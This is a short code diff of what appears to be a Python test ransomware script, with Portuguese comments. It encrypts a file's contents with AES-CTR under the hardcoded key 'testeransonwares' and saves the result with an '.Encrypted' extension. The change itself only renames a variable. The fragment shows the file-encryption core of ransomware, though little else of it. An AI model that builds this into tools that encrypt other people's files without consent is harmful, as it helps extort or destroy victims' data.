@@ -19,10 +19,10 @@ key = b"testeransonwares"
 aes = pyaes.AESModeOfOperationCTR(key)
 
     ##Criptgrafar arquivo
-cryptoData = aes.encrypt(fileData)
+encryptData = aes.encrypt(fileData)
 
     ##SalvarArquivoCriptografado
 nwFile = fName + ".Encrypted"
 nwFile = open(f'{nwFile}', 'wb')
-nwFile.write(cryptoData)
+nwFile.write(encryptData)
 nwFile.close()
